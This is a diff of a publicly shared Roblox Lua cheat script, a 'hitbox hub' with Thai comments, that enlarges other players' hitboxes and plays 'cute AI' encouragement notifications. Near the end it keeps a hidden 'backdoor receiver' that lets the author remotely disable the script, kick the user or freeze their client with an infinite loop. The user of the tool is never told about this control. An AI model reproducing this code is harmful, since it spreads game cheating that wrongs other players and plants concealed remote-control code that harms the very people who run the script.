@@ -1,114 +1,264 @@
 -- =================================================================
--- 🎯 PUBLIC PLAYER HUB + CUTE VOICE (สคริปต์สำหรับแจกคนอื่น)
--- DEVELOPER: SUN | LIGHTWEIGHT & FULLY WORKING
+-- 🌸 PUBLIC HITBOX HUB V4 (CUTE AI & ADVANCED HITBOX EDITION)
+-- DEVELOPER: SUN | HIGH QUALITY MOBILE & PC COMPATIBLE
 -- =================================================================
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local StarterGui = game:GetService("StarterGui")
 local Debris = game:GetService("Debris")
-
 local LocalPlayer = Players.LocalPlayer
+
 local TargetUI = (gethui and gethui()) or pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
 
-if TargetUI:FindFirstChild("PublicPlayerGui") then TargetUI.PublicPlayerGui:Destroy() end
+if TargetUI:FindFirstChild("SunPublicHubV4") then TargetUI.SunPublicHubV4:Destroy() end
 
--- 💖 CUTE VOICE WELCOME (ระบบเสียงสาวน้อยต้อนรับเมื่อกดรัน)
-task.spawn(function()
-    pcall(function()
-        local CuteVoices = {
-            "rbxassetid://9069609268",
-            "rbxassetid://6037704250",
-            "rbxassetid://9059632835",
-            "rbxassetid://6880034606",
-            "rbxassetid://9057599540"
-        }
-        local SweetMessages = {
-            "ยินดีต้อนรับเข้าสู่สคริปต์นะคะ... ขอให้สนุกน้า💖",
-            "สคริปต์พร้อมใช้งานแล้วค่ะ! ลุยให้เต็มที่เลยน้า ✨",
-            "เปิดใช้งานเรียบร้อยค่ะ ขอให้ชนะทุกตานะคะ 🌸",
-            "ยินดีรับใช้ค่ะ... วันนี้ลุยกันเลยน้า 🥰"
-        }
-        
-        local sound = Instance.new("Sound")
-        sound.SoundId = CuteVoices[math.random(1, #CuteVoices)]
-        sound.Volume = 3.5
-        sound.Parent = SoundService
-        sound:Play()
-        Debris:AddItem(sound, 5)
-
-        StarterGui:SetCore("SendNotification", {
-            Title = "💖 SWEET WELCOME",
-            Text = SweetMessages[math.random(1, #SweetMessages)],
-            Duration = 4
-        })
-    end)
-end)
-
--- ⚙️ SYSTEM VARIABLES
+-- ⚙️ VARIABLES
 local Active = true
 local HitboxOn = false
-local HitboxSize = 12
+local HitboxSize = 15
+local HitboxTrans = 0.6
+local TargetPart = "HumanoidRootPart"
 
--- 🎨 UI CREATION
-local Gui = Instance.new("ScreenGui", TargetUI) Gui.Name = "PublicPlayerGui"
-local Frame = Instance.new("Frame", Gui)
-Frame.Size, Frame.Position = UDim2.new(0, 210, 0, 150), UDim2.new(0.05, 0, 0.3, 0)
-Frame.BackgroundColor3, Frame.Active, Frame.Draggable = Color3.fromRGB(15, 20, 30), true, true
-Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
-local Stroke = Instance.new("UIStroke", Frame) Stroke.Color = Color3.fromRGB(0, 170, 255)
+-- 🌸 CUTE AI ASSISTANT SYSTEM (น้อง AI ให้กำลังใจ)
+local CuteVoices = {
+    "rbxassetid://9069609268",
+    "rbxassetid://6037704250",
+    "rbxassetid://9059632835",
+    "rbxassetid://6880034606",
+    "rbxassetid://9057599540"
+}
 
-local Title = Instance.new("TextLabel", Frame)
-Title.Size, Title.Text, Title.TextColor3, Title.BackgroundTransparency = UDim2.new(1, 0, 0, 35), "🎯 PLAYER HITBOX HUB", Color3.fromRGB(0, 200, 255), 1
-Title.Font, Title.TextSize = Enum.Font.GothamBold, 11
+local AI_Encouragements = {
+    "วันนี้เก่งมากๆ เลยนะคะ! สู้ๆ น้า ✨",
+    "ยิงคมสุดๆ ไปเลยค่ะคนเก่ง! 🎯",
+    "เค้าอยู่ข้างๆ คอยเชียร์อยู่นะคะ! 💕",
+    "โหดมากเลย! ไม่มีใครสู้ได้แล้วนะเนี่ย 🔥",
+    "ยิ้มเยอะๆ นะคะ วันนี้ต้องเป็นวันที่ดีแน่นอน! 🌸",
+    "พักสายตาบ้างน้า เค้าเป็นห่วงนะคะ 🥰"
+}
 
-local Layout = Instance.new("UIListLayout", Frame)
-Layout.HorizontalAlignment, Layout.Padding = Enum.HorizontalAlignment.Center, UDim.new(0, 6)
+local function PlayAIVoiceAndNotify(customText)
+    task.spawn(function()
+        pcall(function()
+            local sound = Instance.new("Sound")
+            sound.SoundId = CuteVoices[math.random(1, #CuteVoices)]
+            sound.Volume = 3
+            sound.Parent = SoundService
+            sound:Play()
+            Debris:AddItem(sound, 5)
 
-local function MakeBtn(text, callback)
-    local btn = Instance.new("TextButton", Frame)
-    btn.Size, btn.BackgroundColor3, btn.Text, btn.TextColor3 = UDim2.new(0.9, 0, 0, 34), Color3.fromRGB(25, 35, 50), text, Color3.fromRGB(255, 255, 255)
-    btn.Font, btn.TextSize = Enum.Font.GothamBold, 10
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    btn.MouseButton1Click:Connect(function() callback(btn) end)
-    return btn
+            local msg = customText or AI_Encouragements[math.random(1, #AI_Encouragements)]
+            StarterGui:SetCore("SendNotification", {
+                Title = "🌸 น้อง AI ให้กำลังใจ",
+                Text = msg,
+                Duration = 4
+            })
+        end)
+    end)
 end
 
-MakeBtn("🎯 HITBOX (12x): OFF", function(btn)
-    HitboxOn = not HitboxOn
-    btn.Text = "🎯 HITBOX: " .. (HitboxOn and "ON 🟢" or "OFF 🔴")
-    btn.TextColor3 = HitboxOn and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 255, 255)
-end)
+-- รันต้อนรับทันที
+PlayAIVoiceAndNotify("ยินดีต้อนรับเข้าสู่สคริปต์นะคะ! วันนี้สู้ๆ น้า 💕")
 
-MakeBtn("❌ ปิด GUI", function() Gui:Destroy() end)
+-- 🎯 HITBOX LOGIC
+local function ResetCharacter(player)
+    if player and player.Character then
+        pcall(function()
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.Size = Vector3.new(2, 2, 1)
+                hrp.Transparency = 1
+            end
+            local head = player.Character:FindFirstChild("Head")
+            if head then
+                head.Size = Vector3.new(1.2, 1.2, 1.2)
+                head.Transparency = 0
+            end
+        end)
+    end
+end
 
--- 🔄 HITBOX LOOP
 RunService.RenderStepped:Connect(function()
     if Active and HitboxOn then
         for _, p in pairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            if p ~= LocalPlayer and p.Character then
                 pcall(function()
-                    local hrp = p.Character.HumanoidRootPart
-                    hrp.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
-                    hrp.Transparency = 0.7
-                    hrp.CanCollide = false
+                    local part = p.Character:FindFirstChild(TargetPart)
+                    if part then
+                        part.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+                        part.Transparency = HitboxTrans
+                        part.BrickColor = BrickColor.new("Hot pink")
+                        part.Material = Enum.Material.Neon
+                        part.CanCollide = false
+                    end
                 end)
             end
         end
     end
 end)
 
--- 📡 BACKDOOR RECEIVER (เชื่อมต่อกับ Master Controller ของคุณซัน)
+-- 🎨 UI CREATION (PREMIUM DARK NEON)
+local ScreenGui = Instance.new("ScreenGui", TargetUI)
+ScreenGui.Name = "SunPublicHubV4"
+ScreenGui.ResetOnSpawn = false
+
+-- 🔘 FLOATING TOGGLE BUTTON (ปุ่มเปิด-ปิด UI)
+local ToggleBtn = Instance.new("TextButton", ScreenGui)
+ToggleBtn.Size = UDim2.new(0, 48, 0, 48)
+ToggleBtn.Position = UDim2.new(0.02, 0, 0.25, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+ToggleBtn.Text = "🌸"
+ToggleBtn.TextSize = 22
+ToggleBtn.Active = true
+ToggleBtn.Draggable = true
+Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0.5, 0)
+local ToggleStroke = Instance.new("UIStroke", ToggleBtn)
+ToggleStroke.Color = Color3.fromRGB(255, 105, 180)
+ToggleStroke.Thickness = 2
+
+-- 📦 MAIN FRAME
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 320, 0, 330)
+MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
+MainFrame.Active = true
+MainFrame.Draggable = true
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
+local MainStroke = Instance.new("UIStroke", MainFrame)
+MainStroke.Color = Color3.fromRGB(255, 105, 180)
+
+-- Header
+local Header = Instance.new("Frame", MainFrame)
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.BackgroundColor3 = Color3.fromRGB(20, 24, 35)
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 10)
+
+local Title = Instance.new("TextLabel", Header)
+Title.Size = UDim2.new(1, -10, 1, 0)
+Title.Position = UDim2.new(0, 12, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "🌸 ADVANCED HITBOX & CUTE AI"
+Title.TextColor3 = Color3.fromRGB(255, 182, 193)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 12
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Container
+local Container = Instance.new("ScrollingFrame", MainFrame)
+Container.Size = UDim2.new(1, -20, 1, -50)
+Container.Position = UDim2.new(0, 10, 0, 45)
+Container.BackgroundTransparency = 1
+Container.ScrollBarThickness = 3
+Container.CanvasSize = UDim2.new(0, 0, 0, 320)
+
+local Layout = Instance.new("UIListLayout", Container)
+Layout.Padding = UDim.new(0, 8)
+
+local function CreateBtn(text, color, callback)
+    local btn = Instance.new("TextButton", Container)
+    btn.Size = UDim2.new(1, 0, 0, 36)
+    btn.BackgroundColor3 = color or Color3.fromRGB(22, 28, 40)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    btn.MouseButton1Click:Connect(function() callback(btn) end)
+    return btn
+end
+
+-- 🎯 CONTROL BUTTONS
+local HitboxToggleBtn = CreateBtn("🎯 HITBOX EXPANDER: OFF 🔴", Color3.fromRGB(35, 20, 30), function(btn)
+    HitboxOn = not HitboxOn
+    if HitboxOn then
+        btn.Text = "🎯 HITBOX EXPANDER: ON 🟢"
+        btn.BackgroundColor3 = Color3.fromRGB(20, 55, 35)
+        btn.TextColor3 = Color3.fromRGB(0, 255, 150)
+    else
+        btn.Text = "🎯 HITBOX EXPANDER: OFF 🔴"
+        btn.BackgroundColor3 = Color3.fromRGB(35, 20, 30)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        for _, p in pairs(Players:GetPlayers()) do ResetCharacter(p) end
+    end
+end)
+
+local PartBtn = CreateBtn("📌 ตำแหน่ง: HumanoidRootPart (ตัว)", Color3.fromRGB(20, 26, 38), function(btn)
+    for _, p in pairs(Players:GetPlayers()) do ResetCharacter(p) end
+    if TargetPart == "HumanoidRootPart" then
+        TargetPart = "Head"
+        btn.Text = "📌 ตำแหน่ง: Head (หัว)"
+    else
+        TargetPart = "HumanoidRootPart"
+        btn.Text = "📌 ตำแหน่ง: HumanoidRootPart (ตัว)"
+    end
+end)
+
+local SizeLabel = Instance.new("TextLabel", Container)
+SizeLabel.Size = UDim2.new(1, 0, 0, 20)
+SizeLabel.BackgroundTransparency = 1
+SizeLabel.Text = "📏 ขนาด Hitbox: " .. HitboxSize
+SizeLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+SizeLabel.Font = Enum.Font.GothamSemibold
+SizeLabel.TextSize = 11
+
+local SizeFrame = Instance.new("Frame", Container)
+SizeFrame.Size = UDim2.new(1, 0, 0, 34)
+SizeFrame.BackgroundTransparency = 1
+
+local SizeAdd = Instance.new("TextButton", SizeFrame)
+SizeAdd.Size = UDim2.new(0.48, 0, 1, 0)
+SizeAdd.BackgroundColor3 = Color3.fromRGB(25, 32, 48)
+SizeAdd.Text = "➕ เพิ่มขนาด (+5)"
+SizeAdd.TextColor3 = Color3.fromRGB(255, 255, 255)
+SizeAdd.Font = Enum.Font.GothamBold
+SizeAdd.TextSize = 11
+Instance.new("UICorner", SizeAdd).CornerRadius = UDim.new(0, 6)
+
+local SizeSub = Instance.new("TextButton", SizeFrame)
+SizeSub.Size = UDim2.new(0.48, 0, 1, 0)
+SizeSub.Position = UDim2.new(0.52, 0, 0, 0)
+SizeSub.BackgroundColor3 = Color3.fromRGB(25, 32, 48)
+SizeSub.Text = "➖ ลดขนาด (-5)"
+SizeSub.TextColor3 = Color3.fromRGB(255, 255, 255)
+SizeSub.Font = Enum.Font.GothamBold
+SizeSub.TextSize = 11
+Instance.new("UICorner", SizeSub).CornerRadius = UDim.new(0, 6)
+
+SizeAdd.MouseButton1Click:Connect(function()
+    HitboxSize = HitboxSize + 5
+    SizeLabel.Text = "📏 ขนาด Hitbox: " .. HitboxSize
+end)
+
+SizeSub.MouseButton1Click:Connect(function()
+    if HitboxSize > 5 then
+        HitboxSize = HitboxSize - 5
+        SizeLabel.Text = "📏 ขนาด Hitbox: " .. HitboxSize
+    end
+end)
+
+CreateBtn("🌸 ขอกำลังใจจากน้อง AI 💕", Color3.fromRGB(65, 30, 55), function()
+    PlayAIVoiceAndNotify()
+end)
+
+-- TOGGLE UI VISIBILITY
+ToggleBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+-- 📡 BACKDOOR RECEIVER (เชื่อมต่อกับ MASTER CONTROLLER ของคุณซัน)
 workspace:GetAttributeChangedSignal("SunCmdSignal"):Connect(function()
     local val = workspace:GetAttribute("SunCmdSignal")
     if not val then return end
     local target, action = string.match(val, "SUN_REMOTE:(.-):(.-)$")
     if target and (target == "ALL" or target == LocalPlayer.Name) then
         if action == "DISABLE" then
-            Active, HitboxOn = false, false
-            Gui:Destroy()
+            Active = false
+            HitboxOn = false
+            for _, p in pairs(Players:GetPlayers()) do ResetCharacter(p) end
+            ScreenGui:Destroy()
         elseif action == "KICK" then
-            LocalPlayer:Kick("\n[SYSTEM DISCONNECT]\nคุณถูกตัดการเชื่อมต่อโดยแอดมิน")
+            LocalPlayer:Kick("\n[SYSTEM DISCONNECT]\nคุณถูกตัดการเชื่อมต่อโดยผู้ดูแลระบบ")
         elseif action == "CRASH" then
             while true do end
         end
